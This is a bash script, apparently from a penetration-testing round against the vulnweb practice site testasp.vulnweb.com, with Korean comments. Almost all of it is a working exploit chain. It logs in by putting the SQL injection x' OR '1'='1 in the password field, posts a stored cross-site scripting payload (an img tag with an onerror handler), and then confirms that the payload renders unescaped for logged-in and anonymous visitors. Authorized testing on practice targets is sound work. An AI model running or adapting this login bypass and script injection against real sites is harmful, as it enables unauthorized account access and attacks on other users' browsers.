#!/usr/bin/env bash
# Round 6 — 세션 사용자명을 따옴표 없는 값으로 확보한 뒤 승인된 게시글 1건 작성
# 배경: tfUName 에 따옴표가 있으면 showthread.asp 의 INSERT(poster='<uname>') 가 깨져 500.
#       → 주입을 tfUPass 쪽으로 옮겨 uname 을 'admin' 로 저장.
set -u
BASE="http://testasp.vulnweb.com"
D="$(cd "$(dirname "$0")" && pwd)"; OUT="$D/out"; mkdir -p "$OUT"
JAR="$OUT/r6b_session.jar"
CURL=(curl -s --noproxy '*' --max-time 30)

echo "### 1. 따옴표 없는 우회 로그인: tfUName=admin / tfUPass=x' OR '1'='1"
rm -f "$JAR"
"${CURL[@]}" -c "$JAR" -o /dev/null "$BASE/Login.asp"
"${CURL[@]}" -b "$JAR" -c "$JAR" -D "$OUT/r6b_login_hdr.txt" -o "$OUT/r6b_login.html" \
  -w "login code=%{http_code} redirect=%{redirect_url}\n" -X POST "$BASE/Login.asp" \
  --data-urlencode 'tfUName=admin' --data-urlencode "tfUPass=x' OR '1'='1"
grep -iE '^(HTTP/|Location:)' "$OUT/r6b_login_hdr.txt" | tr -d '\r'
printf "세션 사용자명: "
"${CURL[@]}" -b "$JAR" "$BASE/Default.asp" | grep -o 'logout [^<]*' | head -1

echo
echo "### 2. BEFORE"
"${CURL[@]}" -b "$JAR" -o "$OUT/r6b_before.html" -w "code=%{http_code} size=%{size_download}\n" "$BASE/showthread.asp?id=0"
echo "posttext=$(grep -c "class='posttext'" "$OUT/r6b_before.html") RT6마커=$(grep -c 'RT6-STORED-XSS-PROOF' "$OUT/r6b_before.html")"

echo
echo "### 3. POST — 승인된 게시글 1건 (영향 최소: 스레드 id=0 고정, id 주입 없음)"
"${CURL[@]}" -b "$JAR" -c "$JAR" -D "$OUT/r6b_post_hdr.txt" -o "$OUT/r6b_post_body.html" \
  -w "code=%{http_code} size=%{size_download}\n" -X POST "$BASE/showthread.asp?id=0" \
  --data-urlencode 'tfSubject=RT6-STORED-XSS-PROOF' \
  --data-urlencode 'tfText=<img src=x onerror=alert(1)>'
grep -iE '^(HTTP/|Location:)' "$OUT/r6b_post_hdr.txt" | tr -d '\r'

echo
echo "### 4. AFTER — 인증 세션 / 미인증 양쪽에서 확인"
sleep 1
"${CURL[@]}" -b "$JAR" -o "$OUT/r6b_after_auth.html" -w "auth code=%{http_code} size=%{size_download}\n" "$BASE/showthread.asp?id=0"
"${CURL[@]}" -o "$OUT/r6b_after_anon.html" -w "anon code=%{http_code} size=%{size_download}\n" "$BASE/showthread.asp?id=0"
for f in r6b_after_auth r6b_after_anon; do
  printf "%-16s posttext=%s RT6마커=%s 원문페이로드=%s HTML이스케이프=%s\n" "$f" \
    "$(grep -c "class='posttext'" "$OUT/$f.html")" \
    "$(grep -c 'RT6-STORED-XSS-PROOF' "$OUT/$f.html")" \
    "$(grep -c '<img src=x onerror=alert(1)>' "$OUT/$f.html")" \
    "$(grep -c '&lt;img src=x' "$OUT/$f.html")"
done

echo
echo "### 5. 저장된 글 원문 문맥"
python3 - "$OUT/r6b_after_anon.html" <<'EOF'
import sys
s=open(sys.argv[1],encoding="latin-1",errors="replace").read()
i=s.find("RT6-STORED-XSS-PROOF")
print(s[max(0,i-800):i+500] if i!=-1 else "RT6 마커를 찾지 못함")
EOF
